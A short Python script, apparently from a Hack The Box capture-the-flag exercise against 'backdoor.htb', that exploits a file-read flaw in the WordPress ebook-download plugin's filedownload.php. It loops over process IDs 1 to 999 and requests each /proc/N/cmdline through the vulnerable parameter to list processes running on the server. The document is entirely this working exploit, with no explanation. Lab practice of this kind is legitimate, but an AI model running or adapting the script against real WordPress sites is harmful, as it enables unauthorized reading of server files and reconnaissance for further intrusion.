import requests
import sys
import signal


def def_hundler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_hundler)

main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

for i in range(1,1000):
    url = main_url + "/proc/" + str(i) + "/cmdline"
    r = requests.get(url)
    print(r)

